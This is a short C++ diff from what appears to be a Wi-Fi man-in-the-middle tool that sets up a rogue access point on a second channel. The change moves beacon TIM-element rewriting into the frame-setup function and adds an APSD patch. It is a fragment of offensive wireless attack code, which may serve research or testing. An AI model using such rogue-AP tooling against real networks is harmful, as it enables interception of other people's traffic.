@@ -60,6 +60,16 @@ void McMitm::setup_real_AP_RSN_frames(int beacon_timeout_sec) {
 	if(auto *ch_ie = beacon->search_option(Dot11ManagementFrame::DS_SET))
 		const_cast<uint8_t *>(ch_ie->data_ptr())[0] = netconfig.rogue_channel.ch_num;
 	probe_resp = make_unique<Dot11ProbeResponse>(beacon_to_probe_resp(*beacon, netconfig.rogue_channel));
+
+	if(auto *tim_ie = beacon->search_option(Dot11ManagementFrame::TIM)) {
+		vector tim(tim_ie->data_ptr(), tim_ie->data_ptr() + tim_ie->data_size());
+		if(tim.size() >= 4)
+			fill(tim.begin() + 3, tim.end(), 0xFF);
+		beacon->remove_option(Dot11ManagementFrame::TIM);
+		beacon->add_option({Dot11ManagementFrame::TIM, static_cast<uint32_t>(tim.size()), tim.data()});
+	}
+
+	patch_apsd(*beacon);
 	log(LogLevel::INFO, "Target network {} detected on channel {}", ap.get(SK::mac), netconfig.real_channel.ch_num);
 }
 //FIXME zkontrolovat, že nepřeposílám ACK
@@ -73,14 +83,6 @@ void McMitm::run(RunStatus &rs, const int timeout_sec) {
 	log(LogLevel::INFO,
 		"Note: keep >1 meter between interfaces. Else packet delivery is unreliable & target may disconnect");
 	setup_real_AP_RSN_frames(att_cfg.at("beacon_timeout_sec"));
-	if(auto *tim_ie = beacon->search_option(Dot11ManagementFrame::TIM)) {
-		vector tim(tim_ie->data_ptr(), tim_ie->data_ptr() + tim_ie->data_size());
-		if(tim.size() >= 4)
-			fill(tim.begin() + 3, tim.end(), 0xFF);
-		beacon->remove_option(Dot11ManagementFrame::TIM);
-		beacon->add_option({Dot11ManagementFrame::TIM, static_cast<uint32_t>(tim.size()), tim.data()});
-	}
-
 	log(LogLevel::INFO,
 		"Will use {} to create rogue AP on channel {}",
 		rogue_ap->get_mon_iface(),
